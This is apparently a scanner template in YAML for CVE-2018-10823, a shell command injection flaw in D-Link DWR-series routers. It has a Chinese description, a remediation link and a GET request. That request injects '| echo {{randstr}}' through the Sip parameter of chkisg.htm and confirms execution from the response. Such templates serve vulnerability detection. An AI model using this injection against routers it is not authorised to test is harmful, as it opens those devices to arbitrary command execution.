id: CVE-2018-10823
info:
  name: D-Link Routers - Command Injection
  author:
  - l0ne1y
  description: |-
    D-Link路由器httpd server shell命令注入漏洞
    D-Link DWR-116等都是友讯（D-Link）公司的无线路由器产品。

    多款D-Link产品中存在安全漏洞。攻击者可通过向hkisg.htm页面的‘Sip’参数注入shell命令利用该漏洞执行任意代码。以下产品和版本受到影响：D-Link DWR-116 1.06及之前版本；DWR-512 2.02及之前版本；DWR-712 2.02及之前版本；DWR-912 2.02及之前版本；DWR-921 2.02及之前版本；DWR-111 1.01及之前版本。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.dlink.com/
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body,randstr)
    - '!regex("echo.*?{{randstr}}",body)'
    - status_code == 200
  path:
  - '{{BaseURL}}/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20echo%20{{randstr}}'
  method: GET
